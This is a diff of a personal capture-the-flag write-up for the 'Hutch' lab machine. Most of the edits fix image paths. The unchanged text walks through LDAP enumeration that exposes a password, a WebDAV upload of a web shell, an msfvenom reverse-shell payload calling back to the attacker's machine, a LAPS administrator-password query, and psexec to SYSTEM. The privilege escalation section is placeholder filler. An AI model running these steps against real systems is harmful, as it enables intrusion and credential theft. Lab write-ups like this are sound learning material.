@@ -3,7 +3,7 @@ Alias: Hutch
 Date: 10/2/22
 Platform: Windows
 Difficulty: Intermediate
-Tags:
+Tags: #ActiveDirectory 
 Status: Finished
 IP: 192.168.142.122
 ---
@@ -186,7 +186,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 Enumerated open TCP ports:
 ```bash
-
+389
+3268
+80
 ```
 
 Enumerated top 200 UDP ports:
@@ -201,33 +203,35 @@ Enumerated top 200 UDP ports:
 
 #### -Typed "nmap -n -sV -Pn --script "ldap* and not brute" 192.168.142.122" and found the domain of ldap to be hutch.offsec
 
-![](Pasted%20image%2020221019004447.png)
+![](Images/Pasted%20image%2020221019004447.png)
 #LDAPenumeration
 
 #### -Typed "ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.142.122" "(objectclass=*)"" to enumerate the LDAP service:
 
-![](Pasted%20image%2020221019005210.png)
+![](Images/Pasted%20image%2020221019005210.png)
 #LDAPsearch
 
 #### -Per the ldap enumeration script we find user Freddy McsSorley (account name fmcsorley) with password "CrabSharkJellyfish192":
 
-![](Pasted%20image%2020221019005459.png)
+![](Images/Pasted%20image%2020221019005459.png)
 
-![](Pasted%20image%2020221019005630.png)
+![](Images/Pasted%20image%2020221019005630.png)
 
 #### -Typed "cadaver http://192.168.142.122 " and user fmcsorley with password CrabSharkJellyfish192:
 
-![](Pasted%20image%2020221019005929.png)
-![](Pasted%20image%2020221019010137.png)
+![](Images/Pasted%20image%2020221019005929.png)
+![](Images/Pasted%20image%2020221019010137.png)
 #Cadaver
 
 #### -Typed "put /usr/share/webshells/asp/cmdasp.aspx" and navigated to "http://192.168.142.122/cmdasp.aspx" and find the following web page showing the cmdasp.asp file successfully downloaded to the target machine and was able to run commands:
 
-![](Pasted%20image%2020221019010408.png)
+![](Images/Pasted%20image%2020221019010408.png)
 
-![](Pasted%20image%2020221019010645.png)
+![](Images/Pasted%20image%2020221019010645.png)
 
-![](Pasted%20image%2020221019010904.png)
+
+
+![](Images/Pasted%20image%2020221019010904.png)
 #aspxcmdWebShell
 
 
@@ -238,28 +242,28 @@ Enumerated top 200 UDP ports:
 
 #### -Googled "Microsoft-IIS/10.10 root directory"
 
-![](Pasted%20image%2020221019011200.png)
+![](Images/Pasted%20image%2020221019011200.png)
 #Microsoft-IIS/10.0RootDirectory
 
 #### -Typed "msfvenom -p windows/shell_reverse_tcp LHOST=[kali IP] LPORT=593 -f exe > reverse.exe"
 
-![](Pasted%20image%2020221019011410.png)
+![](Images/Pasted%20image%2020221019011410.png)
 
 #### -Typed "updog -p 80" on kali machine to host the reverse shell payload
 
 #### -Typed "put /home/brian/Downloads/Proving_Grounds/Hutch/reverse.exe" on the cadaver session to download the reverse shell to target machine:
 
-![](Pasted%20image%2020221019011613.png)
+![](Images/Pasted%20image%2020221019011613.png)
 
 #### -Typed "dir C:\inetpub\wwwroot\" to confirm the reverse shell payload was on the target machine
 
-![](Pasted%20image%2020221019011821.png)
+![](Images/Pasted%20image%2020221019011821.png)
 
 #### -Ran a netcat listener on port 593 on kali machine
 
 #### -Typed "C:\inetpub\wwwroot\reverse.exe" on the webshell and received a reverse shell:
 
-![](Pasted%20image%2020221019012059.png)
+![](Images/Pasted%20image%2020221019012059.png)
 
 ---
 
@@ -268,18 +272,18 @@ Enumerated top 200 UDP ports:
 
 #### -Navigated to "c:\Program Files" directory and shows that Microsoft's _Local Administrator Password Solution (LAPS) is installed:
 
-![](Pasted%20image%2020221019012502.png)
+![](Images/Pasted%20image%2020221019012502.png)
 
-![](Pasted%20image%2020221019012617.png)
+![](Images/Pasted%20image%2020221019012617.png)
 #LAPS #LocalAdministratorPasswordSolution
 
 #### -I attempt to query LDAP for the local administrator password by typing "ldapsearch -x -H 'ldap://192.168.142.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd" and find administrators password is ",G4$4Yk-2n&x(]":
 
-![](Pasted%20image%2020221019012818.png)
+![](Images/Pasted%20image%2020221019012818.png)
 
 #### - Now that I have valid aministrator credentials I login with psexec.py by typing "python psexec.py hutch.offsec/administrator:',G4$4Yk-2n&x(]'@192.168.142.122" and receive a shell as nt authority\system:
 
-
+![](Images/Pasted%20image%2020221019012951.png)
 
 ## Privilege Escalation vector
 Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
